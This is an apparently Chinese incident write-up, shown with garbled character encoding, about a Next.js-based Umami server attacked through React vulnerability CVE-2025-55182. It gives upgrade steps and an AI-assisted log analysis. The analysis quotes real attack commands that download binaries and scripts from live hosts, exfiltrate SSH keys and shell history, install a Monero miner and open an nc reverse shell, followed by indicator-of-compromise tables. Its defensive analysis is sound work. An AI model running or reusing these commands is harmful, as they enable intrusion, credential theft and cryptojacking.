                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cosine.ren%2Fpost%2Freact-cve-2025" target="_blank" title="https://blog.cosine.ren/post/react-cve-2025" ref="nofollow noopener noreferrer">blog.cosine.ren/post/react-â€¦</a></p>
<blockquote>
<p>æˆ‘å¯¹å®‰å…¨æ–¹é¢çš„çŸ¥è¯†å¾ˆå°‘ï¼Œæœ¬æ–‡å¤§éƒ¨åˆ†å¯èƒ½æœ‰å¾ˆå¤šé”™æ¼ï¼Œå¦‚æœ‰é”™æ¼å¸Œæœ›èƒ½æŒ‡å‡ºã€‚</p>
</blockquote>
<p>2025 å¹´ 12 æœˆ 3 æ—¥ï¼ŒReact å‘å¸ƒäº†ä¸€ä¸ªå ªæ¯”å½“å¹´ Log4j çš„<strong>ä¸¥é‡å®‰å…¨æ¼æ´</strong>ï¼šCVE-2025-55182ï¼ŒCVSS è¯„åˆ† <strong>10.0 æ»¡åˆ†</strong>ï¼</p>
<p>è¿™æ˜¯ React å†å²ä¸Šæœ€ä¸¥é‡çš„æ¼æ´ä¹‹ä¸€ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆUnauthenticated RCEï¼‰ã€‚</p>
<p>åˆšæ”¶åˆ°å®‰å…¨é€šå‘Šï¼Œæˆ‘å°±é©¬ä¸Šæ›´æ–°äº†æ‰€æœ‰å·²çŸ¥çš„ Next.js å’Œ React åº”ç”¨ï¼Œä»¥ä¸ºè¿™äº›åº”è¯¥æ²¡äº‹å„¿äº†ã€‚</p>
<p>ç»“æœä»Šå¤©çªç„¶å‘ç°è‡ªå»ºçš„ Umami æœåŠ¡ 504 äº†æ‰æƒ³èµ·æ¥ï¼Œæ²ƒæ—¥ï¼Œå®ƒæ˜¯ Nextjs å†™çš„å•Šï¼ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e783364bc2c3499ebc2e2b3977b54008~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772438&amp;x-signature=834nkbJcqi5MWU0EAEzDhQrm1Hg%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶æ˜¯åœ¨ docker é‡Œè·‘çš„ï¼Œå¹¶ä¸”ç‚¸çš„æ˜¯æˆ‘ä¸€ä¸ªä¸å¸¸ç”¨çš„æœåŠ¡å™¨ï¼Œæœ€å¤§çš„æŸå¤±æ˜¯ CPU å ç”¨ç‡çªç„¶é£™åˆ° 100% äº†ä¸€æ®µæ—¶é—´ï¼Œç»Ÿè®¡æ•°æ®ä¸¢äº†ä¸å°‘ï¼Œå¯†ç ä»€ä¹ˆçš„éƒ½æ˜¯éšæœºç”Ÿæˆçš„ï¼Œæ¢å°±å¥½äº†ã€‚</p>
<p>éšä¾¿æ‰¾äº†ä¸€ç¯‡åšå®¢çœ‹çœ‹åˆ«äººçš„æƒ…å†µï¼š</p>
<p><a href="https://juejin.cn/post/7580374090365665318" target="_blank" title="https://juejin.cn/post/7580374090365665318">juejin.cn/post/758037â€¦</a></p>
<h2 data-id="heading-0">è§£å†³æ–¹æ¡ˆ</h2>
<p>å…ˆæŠŠæœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆæ”¾åˆ°æœ€å‰é¢ã€‚</p>
<p>å‡çº§ Umamiï¼Œé¦–å…ˆä½¿ç”¨ pg_dump å¤‡ä»½ Umami çš„ PostgreSQL æ•°æ®åº“ã€‚è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤‡ä»½åˆ°å½“å‰ç›®å½•</span>
docker <span class="hljs-built_in">exec</span> umami-db-1 pg_dump -U umami umami &gt; umami_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S).sql

<span class="hljs-comment"># æˆ–è€…å¤‡ä»½åˆ°æŒ‡å®šç›®å½•</span>
docker <span class="hljs-built_in">exec</span> umami-db-1 pg_dump -U umami umami &gt; ~/backups/umami_$(<span class="hljs-built_in">date</span> +%Y%m%d).sql
</code></pre>
<p>ç„¶åï¼Œå› ä¸ºæˆ‘æ˜¯ docker-compose éƒ¨ç½²çš„ï¼Œç›´æ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker compose pull
docker compose up --force-recreate -d
</code></pre>
<p>å°±å¯ä»¥äº†ï¼ŒæŸ¥çœ‹å®¹å™¨æ—¥å¿—ä¸­çš„ Next.js å·²ç»æ˜¯ 15.5.7 ç‰ˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c72ed119ee4460ca40ae3e1ab756abb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772438&amp;x-signature=q%2BInUj%2FyhqB5By5yASac7uX386o%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ æ•°æ®åº“ä½¿ç”¨çš„æ˜¯ mysql çš„è¯ï¼Œé‚£ä¸è¦å‡ 3ï¼Œçœ‹å®˜æ–¹çš„è¿ç§»æ•™ç¨‹</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.umami.is%2Fdocs%2Fguides%2Fmigrate-mysql-postgresql" target="_blank" title="https://docs.umami.is/docs/guides/migrate-mysql-postgresql" ref="nofollow noopener noreferrer">docs.umami.is/docs/guidesâ€¦</a></p>
<h2 data-id="heading-1">æ¼æ´èƒŒæ™¯</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">www.cve.org/CVERecord?iâ€¦</a></p>
<ul>
<li><strong>CVE ç¼–å·</strong>: CVE-2025-55182</li>
<li><strong>CVSS è¯„åˆ†</strong>: 10.0 / 10.0ï¼ˆCriticalï¼‰</li>
<li><strong>æ¼æ´ç±»å‹</strong>: æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆUnauthenticated RCEï¼‰</li>
<li><strong>æŠ«éœ²æ—¶é—´</strong>: 2025 å¹´ 12 æœˆ 3 æ—¥</li>
<li><strong>å®˜æ–¹å…¬å‘Š</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React Blog</a></li>
</ul>
<h3 data-id="heading-2">å—å½±å“çš„ç‰ˆæœ¬</h3>
<p><strong>React æ ¸å¿ƒåŒ…ï¼ˆ19.x ç‰ˆæœ¬ï¼‰</strong>:</p>
<p>19.0, 19.1.0, 19.1.1 å’Œ 19.2.0</p>
<ul>
<li>react-server-dom-webpack</li>
<li>react-server-dom-parcel</li>
<li>react-server-dom-turbopack</li>
</ul>
<p><strong>å—å½±å“çš„æ¡†æ¶</strong>:</p>
<ul>
<li><strong>Next.js</strong>: 14.3.0-canary.77 åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œ15.x, 16.x å…¨éƒ½éœ€è¦å‡åˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>React Router: ä½¿ç”¨ unstable RSC APIs çš„ç‰ˆæœ¬</li>
<li>Waku: ä½¿ç”¨ RSC çš„ç‰ˆæœ¬</li>
<li>Expo: ä½¿ç”¨ RSC çš„ç‰ˆæœ¬</li>
<li>Redwood SDK: &lt; 1.0.0-alpha.0</li>
</ul>
<h3 data-id="heading-3">æ¼æ´åŸç†</h3>
<p>React Server Functions å…è®¸å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡å™¨ä¸Šçš„å‡½æ•°ã€‚React å°†å®¢æˆ·ç«¯è¯·æ±‚è½¬æ¢ä¸º HTTP è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ç«¯ React å†å°† HTTP è¯·æ±‚<strong>ååºåˆ—åŒ–</strong>ä¸ºå‡½æ•°è°ƒç”¨ã€‚</p>
<p><strong>å…³é”®é—®é¢˜</strong>ï¼šæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ HTTP è¯·æ±‚åˆ°ä»»ä½• React Server Function ç«¯ç‚¹ï¼Œå½“ React ååºåˆ—åŒ–è¿™äº› payload æ—¶ï¼Œä¼šè§¦å‘<strong>ä»»æ„ä»£ç æ‰§è¡Œ</strong>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç®€åŒ–çš„æ¼æ´ç¤ºæ„ï¼ˆå®é™…æ›´å¤æ‚ï¼‰</span>
<span class="hljs-comment">// æœåŠ¡å™¨ç«¯çš„ React Server Function å¤„ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleServerFunctionRequest</span>(<span class="hljs-params">payload</span>) {
  <span class="hljs-comment">// âŒ å±é™©ï¼šç›´æ¥ååºåˆ—åŒ–æœªéªŒè¯çš„ payload</span>
  <span class="hljs-keyword">const</span> deserializedData = <span class="hljs-title function_">deserialize</span>(payload);

  <span class="hljs-comment">// å¦‚æœ payload è¢«ç²¾å¿ƒæ„é€ ï¼Œè¿™é‡Œå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç </span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">executeFunction</span>(deserializedData);
}
</code></pre>
<p><strong>å…³é”®å¨èƒ</strong>ï¼š</p>
<ul>
<li>æ— éœ€èº«ä»½éªŒè¯ï¼ˆUnauthenticatedï¼‰</li>
<li>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</li>
<li>å³ä½¿æ²¡æœ‰å®šä¹‰ä»»ä½• Server Functionï¼Œåªè¦ä½¿ç”¨äº† React Server Components å°±æœ‰é£é™©</li>
</ul>
<h2 data-id="heading-4">æ”»å‡»æ‰‹æ®µ</h2>
<p>æ—¢ç„¶æ”»å‡»éƒ½å·²ç»æ”»å‡»äº†ï¼Œé‚£ä¸å¦‚è¶æœºè®© AI åˆ†æå®¹å™¨æ—¥å¿—ï¼Œå€Ÿæ­¤æœºä¼šæ·±å…¥åˆ†æä¸€ä¸‹æ”»å‡»è€…åˆ°åº•æƒ³å¹²ä»€ä¹ˆã€‚</p>
<p><strong>ä»¥ä¸‹æ”»å‡»æ‰‹æ®µæ±‡æ€»ç­‰ï¼Œå…¨ä¸º Claude Sonnet 4.5 æ ¹æ®æ—¥å¿—æ–‡ä»¶è¿›è¡Œåˆ†æå¾—å‡ºçš„æ€»ç»“ï¼Œå¦‚æœ‰é”™æ¼ï¼Œè¿˜è¯·æŒ‡å‡ºã€‚</strong></p>
<h3 data-id="heading-5">æ”»å‡»å…¥å£ï¼šReact Server Components RCE</h3>
<p>ä»æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°å¤§é‡çš„ <code>NEXT_REDIRECT</code> é”™è¯¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"> â¨¯ Error: NEXT_REDIRECT
    at Object.<span class="hljs-built_in">eval</span> [as <span class="hljs-keyword">then</span>] (node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:92:34014) {
  digest: <span class="hljs-string">'12334\nMEOWWWWWWWWW'</span>
}
</code></pre>
<p><strong>è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ ‡å¿—æ€§ç‰¹å¾</strong>ï¼š</p>
<ul>
<li><code>digest: '12334\nMEOWWWWWWWWW'</code> - è¿™ä¸æ˜¯æ­£å¸¸çš„é”™è¯¯æ‘˜è¦</li>
<li>æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„ payload è§¦å‘ React Server Components çš„ååºåˆ—åŒ–æ¼æ´</li>
<li>æ¯æ¬¡ NEXT_REDIRECT é”™è¯¯åéƒ½è·Ÿç€ä¸€ç³»åˆ—çš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå°è¯•</li>
</ul>
<h3 data-id="heading-6">æ¼æ´åˆ©ç”¨ä¸åˆå§‹è®¿é—®</h3>
<p>æ”»å‡»è€…é¦–å…ˆåˆ©ç”¨ CVE-2025-55182 è·å¾—ä»£ç æ‰§è¡Œèƒ½åŠ›ï¼Œç„¶åç«‹å³å°è¯•ä¸‹è½½åé—¨ç¨‹åºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Connecting to 193.34.213.150 (193.34.213.150:80)
wget: can<span class="hljs-string">'t open '</span>x86<span class="hljs-string">': Permission denied
chmod: x86: No such file or directory
/bin/sh: ./x86: not found
</span></code></pre>
<p><strong>æ”»å‡»æµç¨‹</strong>ï¼š</p>
<ol>
<li>å‘ React Server Function ç«¯ç‚¹å‘é€æ¶æ„ payload</li>
<li>è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰§è¡Œ <code>wget</code> å‘½ä»¤</li>
<li>å°è¯•ä» C&amp;C æœåŠ¡å™¨ä¸‹è½½ <code>x86</code> æ¶æ„ç¨‹åºï¼ˆä¸€ä¸ª Linux ELF äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</li>
<li>å°è¯•èµ‹äºˆæ‰§è¡Œæƒé™å¹¶è¿è¡Œ</li>
</ol>
<p><strong>å¦‚æœæˆåŠŸä¼šæ€æ ·ï¼Ÿ</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”»å‡»è€…æƒ³åšçš„äº‹æƒ…ï¼ˆè¢«é˜»æ­¢äº†ï¼‰</span>
wget http://193.34.213.150/x86
<span class="hljs-built_in">chmod</span> +x x86
./x86  <span class="hljs-comment"># è¿™ä¼šå®‰è£…ä¸€ä¸ªåé—¨ç¨‹åº</span>
</code></pre>
<h3 data-id="heading-7">å‡­è¯çªƒå–</h3>
<p>æ”»å‡»è€…æƒ³è¦çªƒå–æ‰€æœ‰æœ‰ä»·å€¼çš„å‡­è¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°è¯• 1ï¼šçªƒå– SSH ç§é’¥</span>
Connecting to 23.19.231.97:36169 (23.19.231.97:36169)
wget: can<span class="hljs-string">'t open '</span>/root/.ssh/id_rsa<span class="hljs-string">': Permission denied
wget --post-file=/root/.ssh/id_rsa http://23.19.231.97:36169/222

# å°è¯• 2ï¼šçªƒå– ECDSA ç§é’¥
wget --post-file=/root/.ssh/id_ecdsa http://23.19.231.97:47023/222

# å°è¯• 3ï¼šçªƒå–å‘½ä»¤å†å²ï¼ˆå¯èƒ½åŒ…å«å¯†ç ï¼‰
cat: can'</span>t open <span class="hljs-string">'/root/.bash_history'</span>: Permission denied
wget --post-data=<span class="hljs-string">"<span class="hljs-subst">$(cat /root/.bash_history)</span>"</span> http://23.19.231.97:44719/222
</code></pre>
<p><strong>è¿™æ˜¯æ•´ä¸ªæ”»å‡»ä¸­æœ€æ¶æ¯’çš„éƒ¨åˆ†</strong>ï¼š</p>
<ul>
<li>SSH ç§é’¥å¯ä»¥è®©æ”»å‡»è€…æ¨ªå‘ç§»åŠ¨åˆ°å…¶ä»–æœåŠ¡å™¨</li>
<li><code>.bash_history</code> å¯èƒ½åŒ…å«ï¼š
<ul>
<li>æ•°æ®åº“å¯†ç </li>
<li>API å¯†é’¥</li>
<li>äº‘æœåŠ¡å‡­è¯ï¼ˆAWSã€GCP ç­‰ï¼‰</li>
<li>å†…éƒ¨ç³»ç»Ÿåœ°å€</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">æŒä¹…åŒ–åé—¨</h3>
<p>æ”»å‡»è€…å°è¯•å»ºç«‹å¤šä¸ªåé—¨ä»¥ä¿æŒè®¿é—®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¼ªè£…æˆå¥åº·æ£€æŸ¥è„šæœ¬</span>
sh: can<span class="hljs-string">'t create /dev/health.sh: Permission denied
chmod: /dev/health.sh: No such file or directory

# å°è¯•ä»å¤šä¸ªæºä¸‹è½½æ¶æ„è„šæœ¬
(curl -s -k https://repositorylinux.xyz/cron.sh || \
 wget --no-check-certificate -q -O- https://repositorylinux.xyz/cron.sh) | bash

# Windows PowerShell ç¼–ç å‘½ä»¤ï¼ˆè‡ªåŠ¨åŒ–è„šæœ¬ï¼‰
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAC4ALgAu
</span></code></pre>
<p><strong>è§£ç  PowerShell å‘½ä»¤</strong>ï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell"># Base64 è§£ç åçš„å†…å®¹
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://repositorylinux.xyz/script_kill.ps1')
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ª<strong>è·¨å¹³å°æ”»å‡»</strong>ï¼šåŒæ—¶å°è¯• Linux (bash) å’Œ Windows (PowerShell) å‘½ä»¤ã€‚</p>
<h3 data-id="heading-9">åŠ å¯†è´§å¸æŒ–çŸ¿</h3>
<p>æœ€è€—èµ„æºçš„éƒ¨åˆ† - è¿™å°±æ˜¯ CPU é£™åˆ° 100% çš„åŸå› ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># C3Pool æŒ–çŸ¿æ± å®‰è£…è„šæœ¬</span>
curl -sLk https://gist.githubusercontent.com/demonic-agents/39e943f4de855e2aef12f34324cbf150/raw/e767e1cef1c35738689ba4df9c6f7f29a6afba1a/setup_c3pool_miner.sh | \
bash -s 49Cf4UaH5mVF2QCBRECpwSWV1C6hPgVWC8vZZkjgjjdYegZKkXERKUB7pXqBHfK1CcjLtMMnTF3J12KZJ83EQCBjT75Stbv

<span class="hljs-comment"># XMRig Monero æŒ–çŸ¿ç¨‹åº</span>
powershell -EncodedCommand [Base64 encoded mining script]
</code></pre>
<p><strong>æŒ–çŸ¿æ”»å‡»ç‰¹å¾</strong>ï¼š</p>
<ul>
<li>é’±åŒ…åœ°å€ï¼š<code>49Cf4UaH5mVF2QCBRECpwSWV1C6hPgVWC8vZZkjgjjdYegZKk...</code>ï¼ˆMoneroï¼‰</li>
<li>çŸ¿æ± ï¼šC3Pool</li>
<li>è¿™ä¼šæ¶ˆè€—æ‰€æœ‰ CPU èµ„æºï¼Œå¯¼è‡´ï¼š- æœåŠ¡å“åº”ç¼“æ…¢ - æœåŠ¡å™¨å®•æœº - äº‘æœåŠ¡è´¦å•æš´å¢
ï¼ˆè¿˜å¥½æ˜¯è‡ªå·±æœåŠ¡å™¨ï¼‰</li>
</ul>
<h3 data-id="heading-10">åå‘ Shell</h3>
<p>å°è¯•å»ºç«‹è¿œç¨‹æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span>: can<span class="hljs-string">'t remove '</span>/tmp/f<span class="hljs-string">': No such file or directory
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc 171.252.32.135 7700 &gt;/tmp/f
</span></code></pre>
<p><strong>åå‘ Shell æŠ€æœ¯åˆ†æ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„å‘½åç®¡é“åå‘ shell</span>
<span class="hljs-built_in">mkfifo</span> /tmp/f              <span class="hljs-comment"># åˆ›å»ºå‘½åç®¡é“</span>
<span class="hljs-built_in">cat</span> /tmp/f | bash -i 2&gt;&amp;1  <span class="hljs-comment"># ä»ç®¡é“è¯»å–å‘½ä»¤å¹¶æ‰§è¡Œ</span>
| nc 171.252.32.135 7700   <span class="hljs-comment"># é€šè¿‡ netcat è¿æ¥åˆ° C&amp;C æœåŠ¡å™¨</span>
&gt;/tmp/f                    <span class="hljs-comment"># å°†è¾“å‡ºå†™å›ç®¡é“</span>
</code></pre>
<p>å¦‚æœæˆåŠŸï¼Œæ”»å‡»è€…å°±å¯ä»¥ï¼š</p>
<ul>
<li>å®æ—¶æ§åˆ¶æœåŠ¡å™¨</li>
<li>æ‰§è¡Œä»»æ„å‘½ä»¤</li>
<li>çªƒå–å®æ—¶æ•°æ®</li>
<li>ä½œä¸ºè·³æ¿æ”»å‡»å†…ç½‘</li>
</ul>
<h3 data-id="heading-11">æ”»å‡»æŒ‡æ ‡ï¼ˆIoCï¼‰æ±‡æ€»</h3>













































<table><thead><tr><th>ç±»å‹</th><th>å€¼</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>æ¶æ„ IP</td><td>193.34.213.150</td><td>æ¶æ„è½¯ä»¶åˆ†å‘</td></tr><tr><td>æ¶æ„ IP</td><td>23.19.231.97</td><td>æ•°æ®çªƒå–æœåŠ¡å™¨</td></tr><tr><td>æ¶æ„ IP</td><td>89.144.31.18</td><td>å¤‡ç”¨æ¶æ„æœåŠ¡å™¨</td></tr><tr><td>æ¶æ„ IP</td><td>171.252.32.135</td><td>åå‘ Shell C2</td></tr><tr><td>æ¶æ„åŸŸå</td><td>repositorylinux.xyz</td><td>è„šæœ¬åˆ†å‘</td></tr><tr><td>æ¶æ„åŸŸå</td><td>dashboard.checkstauts.site</td><td>ç›‘æ§ä»£ç†</td></tr><tr><td>GitHub Gist</td><td>demonic-agents/39e943f4...</td><td>æŒ–çŸ¿è„šæœ¬</td></tr></tbody></table>
<h3 data-id="heading-12">æ¶æ„ IP åœ°å€</h3>






























<table><thead><tr><th>IP åœ°å€</th><th>ç”¨é€”</th><th>å¨èƒç­‰çº§</th></tr></thead><tbody><tr><td>193.34.213.150</td><td>æ¶æ„è½¯ä»¶åˆ†å‘ï¼ˆx86 äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>23.19.231.97</td><td>æ•°æ®çªƒå–æœåŠ¡å™¨ï¼ˆSSH å¯†é’¥ã€å†å²è®°å½•ï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>89.144.31.18</td><td>å¤‡ç”¨æ¶æ„æœåŠ¡å™¨</td><td>ğŸŸ  High</td></tr><tr><td>171.252.32.135</td><td>åå‘ Shell C&amp;C æœåŠ¡å™¨</td><td>ğŸ”´ Critical</td></tr></tbody></table>
<h3 data-id="heading-13">æ¶æ„åŸŸå</h3>




















<table><thead><tr><th>åŸŸå</th><th>ç”¨é€”</th><th>å¨èƒç­‰çº§</th></tr></thead><tbody><tr><td>repositorylinux.xyz</td><td>æ¶æ„è„šæœ¬åˆ†å‘ï¼ˆcron.sh, linux.sh, firewall.shï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>dashboard.checkstauts.site</td><td>ç›‘æ§ä»£ç†/æ•°æ®æ”¶é›†</td><td>ğŸŸ  High</td></tr></tbody></table>
<h3 data-id="heading-14">æ¶æ„èµ„æº</h3>




















<table><thead><tr><th>èµ„æº</th><th>ç±»å‹</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>github.com/demonic-agents/39e943f4...</td><td>GitHub Gist</td><td>C3Pool æŒ–çŸ¿è„šæœ¬</td></tr><tr><td>49Cf4UaH5mVF2QCBRECpwSWV1C6h...</td><td>Monero é’±åŒ…</td><td>æŒ–çŸ¿æ”¶ç›Šåœ°å€</td></tr></tbody></table>
<h2 data-id="heading-15">ä¸ºä»€ä¹ˆæ‰€æœ‰æ”»å‡»éƒ½å¤±è´¥äº†ï¼Ÿ</h2>
<p>å› ä¸ºè¿˜å¥½æ˜¯ Docker è·‘çš„ï¼ŒDocker å®¹å™¨æƒé™éš”ç¦»ï¼Œæˆ‘çš„ Umami å®¹å™¨ï¼š</p>
<ul>
<li>é root ç”¨æˆ·è¿è¡Œï¼Œæ— æ³•å†™å…¥ç³»ç»Ÿç›®å½•</li>
<li>åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼Œæ— æ³•åˆ›å»ºæ¶æ„æ–‡ä»¶</li>
<li>ä¸¢å¼ƒæ‰€æœ‰ Linux Capabilities</li>
<li>ç¦æ­¢ææƒæ“ä½œ</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">Permission denied (é‡å¤ 100+ æ¬¡)
</code></pre>
<p>å‡ ä¹æ‰€æœ‰æ”»å‡»æ“ä½œéƒ½é‡åˆ°äº†æƒé™æ‹’ç»ï¼š</p>
<ul>
<li>æ— æ³•å†™å…¥ <code>/root/.ssh/</code></li>
<li>æ— æ³•åœ¨ <code>/dev/</code> åˆ›å»ºæ–‡ä»¶</li>
<li>æ— æ³•åœ¨ <code>/tmp/</code> åˆ›å»ºç®¡é“</li>
